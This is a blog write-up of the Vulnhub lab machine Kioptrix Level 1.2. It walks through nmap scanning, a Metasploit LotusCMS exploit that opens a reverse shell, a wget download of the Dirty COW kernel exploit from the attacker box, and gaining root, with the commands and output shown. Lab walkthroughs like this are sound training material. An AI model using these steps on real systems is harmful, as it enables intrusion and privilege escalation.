---
layout: post
title: Vulnhub Kioptrix Level 1.2 (#3)
---

This writeup is for the Kioptrix: Level 1.2 (#3) found [here](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/).

The VM was run using VMWare and the attacking machine was a Kali Linux VM running in Virtualbox, with the Kali box running in host-only mode and the
box running in bridged mode.

## Recon and Enumeration
I used netdiscover to find the IP of the box.
```
root@kali:~# netdiscover
```
![netdiscover output]({{ site.baseurl }}/images/KioptrixLevel1_2/netdiscover.png "netdiscover output")

Because I knew that the VM was running in VMWare, I chose the VMWare IP, 192.168.56.106

I then ran `nmap -sV -T4 -p- -vv -sS 192.168.56.107` to find open ports with services running on them.

```
root@kali:~# nmap -sV -T4 -p- -vv -sS 192.168.56.107
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-27 20:14 EDT
NSE: Loaded 43 scripts for scanning.
Initiating ARP Ping Scan at 20:14
Scanning 192.168.56.107 [1 port]
Completed ARP Ping Scan at 20:14, 0.04s elapsed (1 total hosts)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating SYN Stealth Scan at 20:14
Scanning 192.168.56.107 [65535 ports]
Discovered open port 22/tcp on 192.168.56.107
Discovered open port 80/tcp on 192.168.56.107
Completed SYN Stealth Scan at 20:14, 7.14s elapsed (65535 total ports)
Initiating Service scan at 20:14
Scanning 2 services on 192.168.56.107
Completed Service scan at 20:14, 6.03s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.56.107.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.02s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Nmap scan report for 192.168.56.107
Host is up, received arp-response (0.0039s latency).
Scanned at 2019-10-27 20:14:38 EDT for 14s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 00:0C:29:DD:23:37 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.02 seconds
           Raw packets sent: 65554 (2.884MB) | Rcvd: 65536 (2.621MB)
```

I noticed that there may be an http server running on the box, so I went to the IP address in a web browser.

## Vulnerability Discovery

On the main page, there was a link that said login. I clicked on the link and was presented with a logon page.

![Logon page]({{ site.baseurl }}/images/KioptrixLevel1_2/logon.png "Logon page")

I saw that it said it was powered by LotusCMS and discovered that there is a [major vulnerability](https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec) with it that allows a reverse shell to be created.

## Exploitation

I opened metasploit using `msfconsole` and ran the exploit.

```
msf5 > use exploit/multi/http/lcms_php_exec
msf5 exploit(multi/http/lcms_php_exec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf5 exploit(multi/http/lcms_php_exec) > set TARGET 0
TARGET => 0
msf5 exploit(multi/http/lcms_php_exec) > show options

Module options (exploit/multi/http/lcms_php_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic LotusCMS 3.0


msf5 exploit(multi/http/lcms_php_exec) > set RHOST 192.168.56.107
RHOST => 192.168.56.107
msf5 exploit(multi/http/lcms_php_exec) > exploit

[*] Started reverse TCP handler on 192.168.56.101:4444 
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/lcms_php_exec) > set URI /
URI => /
msf5 exploit(multi/http/lcms_php_exec) > exploit

[*] Started reverse TCP handler on 192.168.56.101:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (38247 bytes) to 192.168.56.107
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.107:55755) at 2019-10-27 20:31:24 -0400

meterpreter > shell
Process 4248 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/sh")'
$ 
```

This presented me with a TTY shell.

## Privilege Escalation

I looked around a bit to try and find any sort of exploitable application, but I did not see anything obvious, so I 
looked at the kernel version to find an exploit.

```
$ uname -a
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
```

There wern't any obvoious exploits other than the [Dirty Cow](https://dirtycow.ninja/) exploit. From the website, "A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system."
This allows for a privilege escalation vulnerability on many kernel versions. I specifically used [this](https://www.exploit-db.com/exploits/40839) implementation of the exploit.

I transferred the file to the box using the python SimpleHTTPServer.

```
root@kali:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

I used `wget` on the box to retrieve the file from my Kali VM.

```
$ cd /tmp
$ wget 192.168.56.101/40839.c
```

I then compiled it according to the instructions and ran it.

```
$ gcc -pthread 40839.c -o dirty -lcrypt
$ chmod +x dirty
$ ./dirty password
$ su firefart
Password: password
firefart@Kioptrix3:/tmp#
```

I thought I wasn't done as I wasn't the root user, but after looking at `/etc/passwd`, I realized that there is somehow no root
user on the box and that I was done.

```
firefart@Kioptrix3:/tmp# cat /etc/passwd
cat /etc/passwd
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
```

![Root]({{ site.baseurl }}/images/KioptrixLevel1_2/root.png "Root")

